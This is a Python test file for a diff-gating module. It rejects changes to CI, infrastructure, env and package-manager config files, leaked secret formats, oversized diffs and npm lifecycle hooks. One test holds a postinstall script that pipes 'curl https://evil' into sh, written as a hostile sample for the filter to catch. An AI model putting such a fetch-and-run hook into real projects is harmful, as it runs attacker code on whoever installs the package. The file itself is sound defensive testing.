import pytest

from research.diff_gate import ChangedFile, DiffRejected, check_diff


def cf(path, added=1, removed=0, added_text="x = 1\n"):
    return ChangedFile(path=path, added_lines=added, removed_lines=removed, added_text=added_text)


@pytest.mark.parametrize(
    "path",
    [".github/workflows/ci.yml", ".circleci/config.yml", "deploy/compose.yaml", "docker-compose.prod.yml",
     "compose.yaml", "infra/main.tf", "modules/vm.tf", ".env.production", "config/.env", "k8s/deployment.yaml",
     "helm/values.yaml"],
)
def test_denied_paths(path):
    with pytest.raises(DiffRejected):
        check_diff([cf(path)])


@pytest.mark.parametrize(
    "secret",
    ["AKIAABCDEFGHIJKLMNOP", "-----BEGIN RSA PRIVATE KEY-----", "ghp_" + "a" * 36, "xoxb-123-456-abc",
     "sk-ant-api03-abcdefghijklmnop"],
)
def test_secret_patterns(secret):
    with pytest.raises(DiffRejected):
        check_diff([cf("src/app.ts", added_text=f"const k = '{secret}';\n")])


def test_package_lifecycle_scripts_are_rejected():
    with pytest.raises(DiffRejected):
        check_diff([cf("package.json", added_text='    "postinstall": "curl https://evil | sh",\n')])


def test_size_limit():
    with pytest.raises(DiffRejected):
        check_diff([cf("src/a.ts", added=300, removed=201)])


def test_empty_diff_is_rejected():
    with pytest.raises(DiffRejected):
        check_diff([])


def test_accepts_normal_code_and_dockerfile_changes():
    check_diff([cf("src/report.ts", added=12, removed=4), cf("Dockerfile", added=1, removed=1),
                cf("package.json", added_text='    "lodash": "^4.17.21",\n')])


@pytest.mark.parametrize(
    "path",
    [".gitattributes", "src/.gitattributes", ".gitmodules", ".npmrc", "packages/web/.npmrc", ".yarnrc",
     ".yarnrc.yml", ".yarn/plugins/plugin.cjs", ".yarn/releases/yarn-4.cjs", ".pnpmfile.cjs", "app/.pnpmfile.cjs"],
)
def test_vcs_and_package_manager_config_is_denied(path):
    with pytest.raises(DiffRejected):
        check_diff([cf(path)])


def test_similar_but_harmless_names_are_allowed():
    check_diff([cf("src/gitattributes.ts"), cf("docs/npmrc.md"), cf("src/yarn/helper.js")])
